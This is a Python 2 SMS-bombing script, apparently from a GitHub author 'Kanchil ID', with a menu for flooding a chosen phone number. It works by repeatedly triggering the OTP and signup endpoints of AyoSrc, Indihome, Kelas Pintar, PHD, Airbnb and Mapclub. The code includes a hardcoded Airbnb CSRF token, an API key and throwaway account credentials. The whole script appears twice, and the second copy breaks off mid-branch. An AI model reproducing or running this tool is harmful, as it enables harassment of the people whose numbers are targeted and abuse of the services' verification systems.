# coding: UTF-8

try:
    import subprocess as sp, os, time, sys, requests, random, json
except:
    os.system('pip2 install requests')

hijau = '\x1b[1;92m'
cyan = '\x1b[1;96m'
kuning = '\x1b[1;93m'
ungu = '\x1b[1;95m'
putih = '\x1b[1;97m'
biru = '\x1b[1;94m'
merah = '\x1b[1;91m'
gelap = '\x1b[0;37m'

logo = """
%s                           ____  __  __ ____
 ___ _ __   __ _ _ __ ___ / ___||  \/  / ___|
/ __| '_ \ / _` | '_ ` _  \\___ \| |\/| \___ \

\__ \ |_) | (_| | | | | | |___) | |  | |___) |
|___/ .__/ \__,_|_| |_| |_|____/|_|  |_|____/
    |_|%sAuthor %s: %sKanchil ID
       %sGithub %s: %shttps://github.com/kanchil08
"""%(cyan,biru,merah,ungu,biru,merah,ungu,)

def main():
    os.system('clear')
    print logo
    print '%s{%s=%s} %sSPAM SMS UNLIMITID%s:'%(kuning,cyan,kuning,merah,kuning)
    print '\n     %s{%s01%s}%s Spam AyoSrc'%(kuning,merah,kuning,biru)
    print '     %s{%s02%s}%s Spam Indihome'%(kuning,merah,kuning,biru)
    print '     %s{%s03%s}%s Spam PHD'%(kuning,merah,kuning,biru)
    print '     %s{%s04%s}%s Spam AirBnb'%(kuning,merah,kuning,biru)
    print '     %s{%s05%s}%s Spam Kelas pintar'%(kuning,merah,kuning,biru)
    print '     %s{%s06%s}%s Spam MAPCLUB'%(kuning,merah,kuning,biru)
    print '     %s{%s00%s}%s Exit Menu'%(kuning,hijau,kuning,hijau);print ''
    pilih()

def pilih():
    try:
        ab = raw_input('%s{%s~%s} %sChos Menu %s:%s '%(kuning,cyan,kuning,merah,hijau,biru))
        if ab =='':
            print '%s{%s!%s} %sIsi Dulu Lah Goblok'%(putih,merah,putih,putih)
            pilih()
        elif ab =='1' or ab =='01': #ayosrc
            try:
                print '%s<{%sEX%s: %s628xxx%s}>'%(merah,kuning,biru,kuning,merah)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(kuning,merah,kuning,biru,merah,hijau))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(kuning,merah,kuning,biru,merah,hijau));print ''
                url = 'https://nabil.my.id/api/ayosrcspam'
                r = requests.Session()
                head = {'content-length': '27', 'accept': '*/*', 'origin': 'https://nabil.my.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://nabil.my.id/Ayo_Src_Bom', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                data = {'nomor':nomor,'jumlah':jumla,'delay':'1000'}
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post(url,headers=head,data=data).text
                        if 'Terkirim' in str(x):
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92m'+(x)+' \x1b[1;97m=> \x1b[0;37m'+nomor
                        elif 'Gagal' in str(x):
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91m'+(x)+' \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='2' or ab =='02': #indihome
            try:
                print '%s<{%sEX%s: %s08xxxx%s}>'%(putih,biru,merah,hijau,putih)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(putih,hijau,putih,putih,merah,biru))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(putih,hijau,putih,putih,merah,biru));print ''
                hd = {'origin': 'https://sobat.indihome.co.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://sobat.indihome.co.id/register', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                r = requests.Session()
                dat = {'type': 'hp', 'msisdn': nomor}
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp', headers=hd, data=dat)
                        if 'Kode verifikasi telah dikirim' in x.text:
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92mTerkirim \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='5' or ab =='05': #kelas pintar guys
            try:
                print '%s<{%sEX%s: %s628xxx%s}>'%(putih,biru,merah,hijau,putih)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(putih,hijau,putih,putih,merah,biru))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(putih,hijau,putih,putih,merah,biru));print ''
                hd = {'content-length': '62', 'accept': 'application/json, text/javascript, */*; q=0.01', 'origin': 'https://www.kelaspintar.id', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.kelaspintar.id/', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                r = requests.Session()
                dat = {'user_mobile': nomor, 'otp_type': 'send_otp_reg', 'mobile_code': '+62'}
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://www.kelaspintar.id/user/otpverification', headers=hd, data=dat)
                        if 'successfully' in x.text:
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92mTerkirim \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='3' or ab =='03': #phd
            try:
                print '%s<{%sEX%s: %s8xxxxx%s}>'%(putih,biru,merah,hijau,putih)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(putih,hijau,putih,putih,merah,biru))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(putih,hijau,putih,putih,merah,biru));print ''
                hd = {'origin': 'https://www.phd.co.id', 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.phd.co.id/en/users/createnewuser', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                r = requests.Session()
                dat = {'request_id': '', 'first_name': 'Yayak', 'last_name': 'Yk', 'gender': 'male', 'phone_number': nomor, 'birthday_d': '', 'birthday_m': '', 'birthday_y': '', 'birthday': '1999-03-01', 'username': 'yayakyk22@40gmail.com', 'password': 'Anjaymanar123$$', 'agreeterms': '1'}
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://www.phd.co.id/en/users/createNewUser', headers=hd, data=dat)
                        if 'OK' in x.text:
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92mTerkirim \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='4' or ab =='04': #airbnb
            try:
                print '%s<{%sEX%s: %s628xxx%s}>'%(putih,biru,merah,hijau,putih)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(putih,hijau,putih,putih,merah,biru))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(putih,hijau,putih,putih,merah,biru));print ''
                hd = {'origin': 'https://www.airbnb.co.id', 'x-csrf-token': 'V4$.airbnb.co.id$pgPRrSWF_-4$VvFL20hLPGSifNfUZuQFk0hBSM2sFv7ptbLjEn1qEp0=', 'x-csrf-without-token': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/json', 'accept': 'application/json, text/javascript, */*; q=0.01', 'cache-control': 'no-cache', 'x-requested-with': 'XMLHttpRequest', 'referer': 'https://www.airbnb.co.id/signup_login', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                r = requests.Session()
                data = {'phoneNumber': nomor, 'workFlow': 'GLOBAL_SIGNUP_LOGIN', 'otpMethod': 'TEXT'}
                datajson = json.dumps(data)
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', headers=hd, data=datajson)
                        if 'success' in x.text:
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92mTerkirim \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='6' or ab =='06': #Mapclub
            try:
                print '%s<{%sEX%s: %s08xxxx%s}>'%(putih,biru,merah,hijau,putih)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(putih,hijau,putih,putih,merah,biru))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(putih,hijau,putih,putih,merah,biru));print ''
                r = requests.Session()
                data = {'phone': nomor}
                datajson = json.dumps(data)
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://cmsapi.mapclub.com/api/signup-otp', data=datajson, headers={'Host': 'cmsapi.mapclub.com', 'Connection': 'keep-alive', 'Content-Length': '23', 'Accept': 'application/json, text/plain, */*', 'Origin': 'https://www.mapclub.com', 'Save-Data': 'on', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/json', 'Referer': 'https://www.mapclub.com/id/user/signup', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6,da;q=0.5,pt;q=0.4,jv;q=0.3'})
                        if 'ok' in x.text:
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92mTerkirim \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='0' or ab =='00':
              print '%s{%s!%s} %sExit Menu%s!!'%(putih,merah,putih,putih,merah);exit()
        else:
            print '%s{%s!%s} %s%s%s Not Found'%(putih,merah,putih,merah,ab,putih)
            pilih()
    except KeyboardInterrupt:
        print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
    except EOFError:
        print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()


if __name__ == '__main__':
    main()# coding: UTF-8

try:
    import subprocess as sp, os, time, sys, requests, random, json
except:
    os.system('pip2 install requests')

hijau = '\x1b[1;92m'
cyan = '\x1b[1;96m'
kuning = '\x1b[1;93m'
ungu = '\x1b[1;95m'
putih = '\x1b[1;97m'
biru = '\x1b[1;94m'
merah = '\x1b[1;91m'
gelap = '\x1b[0;37m'

logo = """
%s                           ____  __  __ ____
 ___ _ __   __ _ _ __ ___ / ___||  \/  / ___|
/ __| '_ \ / _` | '_ ` _  \\___ \| |\/| \___ \

\__ \ |_) | (_| | | | | | |___) | |  | |___) |
|___/ .__/ \__,_|_| |_| |_|____/|_|  |_|____/
    |_|%sAuthor %s: %sKanchil ID
       %sGithub %s: %shttps://github.com/kanchil08
"""%(cyan,biru,merah,ungu,biru,merah,ungu)

def main():
    os.system('clear')
    print logo
    print '%s{%s=%s} %sSPAM SMS UNLIMITID%s:'%(kuning,cyan,kuning,merah,kuning)
    print '\n     %s{%s01%s}%s Spam AyoSrc'%(kuning,merah,kuning,biru)
    print '     %s{%s02%s}%s Spam Indihome'%(kuning,merah,kuning,biru)
    print '     %s{%s03%s}%s Spam PHD'%(kuning,merah,kuning,biru)
    print '     %s{%s04%s}%s Spam AirBnb'%(kuning,merah,kuning,biru)
    print '     %s{%s05%s}%s Spam Kelas pintar'%(kuning,merah,kuning,biru)
    print '     %s{%s06%s}%s Spam MAPCLUB'%(kuning,merah,kuning,biru)
    print '     %s{%s00%s}%s Exit Menu'%(kuning,hijau,kuning,hijau);print ''
    pilih()

def pilih():
    try:
        ab = raw_input('%s{%s~%s} %sChos Menu %s:%s '%(kuning,cyan,kuning,merah,hijau,biru))
        if ab =='':
            print '%s{%s!%s} %sIsi Dulu Lah Goblok!!'%(putih,merah,putih,putih)
            pilih()
        elif ab =='1' or ab =='01': #ayosrc
            try:
                print '%s<{%sEX%s: %s628xxx%s}>'%(merah,kuning,biru,kuning,merah)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(kuning,merah,kuning,biru,merah,hijau))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(kuning,merah,kuning,biru,merah,hijau));print ''
                url = 'https://nabil.my.id/api/ayosrcspam'
                r = requests.Session()
                head = {'content-length': '27', 'accept': '*/*', 'origin': 'https://nabil.my.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://nabil.my.id/Ayo_Src_Bom', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                data = {'nomor':nomor,'jumlah':jumla,'delay':'1000'}
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post(url,headers=head,data=data).text
                        if 'Terkirim' in str(x):
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92m'+(x)+' \x1b[1;97m=> \x1b[0;37m'+nomor
                        elif 'Gagal' in str(x):
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91m'+(x)+' \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='2' or ab =='02': #indihome
            try:
                print '%s<{%sEX%s: %s08xxxx%s}>'%(putih,biru,merah,hijau,putih)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(putih,hijau,putih,putih,merah,biru))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(putih,hijau,putih,putih,merah,biru));print ''
                hd = {'origin': 'https://sobat.indihome.co.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://sobat.indihome.co.id/register', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                r = requests.Session()
                dat = {'type': 'hp', 'msisdn': nomor}
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp', headers=hd, data=dat)
                        if 'Kode verifikasi telah dikirim' in x.text:
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92mTerkirim \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='5' or ab =='05': #kelas pintar guys
            try:
                print '%s<{%sEX%s: %s628xxx%s}>'%(putih,biru,merah,hijau,putih)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(putih,hijau,putih,putih,merah,biru))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(putih,hijau,putih,putih,merah,biru));print ''
                hd = {'content-length': '62', 'accept': 'application/json, text/javascript, */*; q=0.01', 'origin': 'https://www.kelaspintar.id', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.kelaspintar.id/', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                r = requests.Session()
                dat = {'user_mobile': nomor, 'otp_type': 'send_otp_reg', 'mobile_code': '+62'}
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://www.kelaspintar.id/user/otpverification', headers=hd, data=dat)
                        if 'successfully' in x.text:
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92mTerkirim \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='3' or ab =='03': #phd
            try:
                print '%s<{%sEX%s: %s8xxxxx%s}>'%(putih,biru,merah,hijau,putih)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(putih,hijau,putih,putih,merah,biru))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(putih,hijau,putih,putih,merah,biru));print ''
                hd = {'origin': 'https://www.phd.co.id', 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.phd.co.id/en/users/createnewuser', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                r = requests.Session()
                dat = {'request_id': '', 'first_name': 'Yayak', 'last_name': 'Yk', 'gender': 'male', 'phone_number': nomor, 'birthday_d': '', 'birthday_m': '', 'birthday_y': '', 'birthday': '1999-03-01', 'username': 'yayakyk22@40gmail.com', 'password': 'Anjaymanar123$$', 'agreeterms': '1'}
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://www.phd.co.id/en/users/createNewUser', headers=hd, data=dat)
                        if 'OK' in x.text:
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92mTerkirim \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='4' or ab =='04': #airbnb
            try:
                print '%s<{%sEX%s: %s628xxx%s}>'%(putih,biru,merah,hijau,putih)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(putih,hijau,putih,putih,merah,biru))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(putih,hijau,putih,putih,merah,biru));print ''
                hd = {'origin': 'https://www.airbnb.co.id', 'x-csrf-token': 'V4$.airbnb.co.id$pgPRrSWF_-4$VvFL20hLPGSifNfUZuQFk0hBSM2sFv7ptbLjEn1qEp0=', 'x-csrf-without-token': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/json', 'accept': 'application/json, text/javascript, */*; q=0.01', 'cache-control': 'no-cache', 'x-requested-with': 'XMLHttpRequest', 'referer': 'https://www.airbnb.co.id/signup_login', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                r = requests.Session()
                data = {'phoneNumber': nomor, 'workFlow': 'GLOBAL_SIGNUP_LOGIN', 'otpMethod': 'TEXT'}
                datajson = json.dumps(data)
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', headers=hd, data=datajson)
                        if 'success' in x.text:
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92mTerkirim \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
                raw_input('%s{%s!%s} %sEnter returns to the menu%s:'%(putih,merah,putih,putih,merah))
                main()
            except KeyboardInterrupt:
                print '%s{%s•%s} %sCTRL+C %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
            except EOFError:
                print '\n%s{%s•%s} %sCTRL+D %sDETECTED'%(putih,hijau,putih,merah,putih);exit()
        elif ab =='6' or ab =='06': #Mapclub
            try:
                print '%s<{%sEX%s: %s08xxxx%s}>'%(putih,biru,merah,hijau,putih)
                nomor = raw_input('%s{%s+%s}%s Number Phone %s:%s '%(putih,hijau,putih,putih,merah,biru))
                jumla = raw_input('%s{%s+%s}%s Jumlah Spam  %s:%s '%(putih,hijau,putih,putih,merah,biru));print ''
                r = requests.Session()
                data = {'phone': nomor}
                datajson = json.dumps(data)
                a = 0
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://cmsapi.mapclub.com/api/signup-otp', data=datajson, headers={'Host': 'cmsapi.mapclub.com', 'Connection': 'keep-alive', 'Content-Length': '23', 'Accept': 'application/json, text/plain, */*', 'Origin': 'https://www.mapclub.com', 'Save-Data': 'on', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/json', 'Referer': 'https://www.mapclub.com/id/user/signup', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6,da;q=0.5,pt;q=0.4,jv;q=0.3'})
                        if 'ok' in x.text:
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92mTerkirim \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
                        print '%s{%s!%s} %sCheck Your Connection'%(putih,merah,putih,merah);exit()
                print '\n%s{%s✓%s} %sDone %s.....'%(putih,hijau,putih,hijau,putih)
